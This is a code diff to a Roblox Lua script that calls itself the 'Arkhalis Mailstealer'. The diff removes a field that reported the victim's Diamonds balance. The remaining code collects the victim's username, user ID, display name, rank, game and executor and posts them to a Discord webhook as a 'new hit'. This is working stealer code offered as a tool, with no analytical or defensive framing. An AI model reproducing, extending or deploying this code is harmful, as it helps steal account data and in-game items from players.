@@ -18,7 +18,6 @@ _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Ran
 _G.PlrUserVictim = game.Players.LocalPlayer.Name
 _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
 _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
-_G.Diamonds = player.leaderstats.Diamonds.Value
 local function sendwebhook(msg)
 local msg = {
   ["content"]= "**Arkhalis Mailstealer has detected a new hit!**",
@@ -28,13 +27,6 @@ local msg = {
       ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\n🔥Executor: "..executor.."",
       ["url"]= "https://discord.gg/34fs3FWt",
       ["color"]= ""..webhookcolor.."",
-      ["fields"]= {
-        {
-          ["name"]= "Diamonds 💎",
-          ["value"]= "```".._G.Diamonds.."```",
-          ["inline"]= true
-        }
-      }
     }
   },
   ["attachments"] = {}
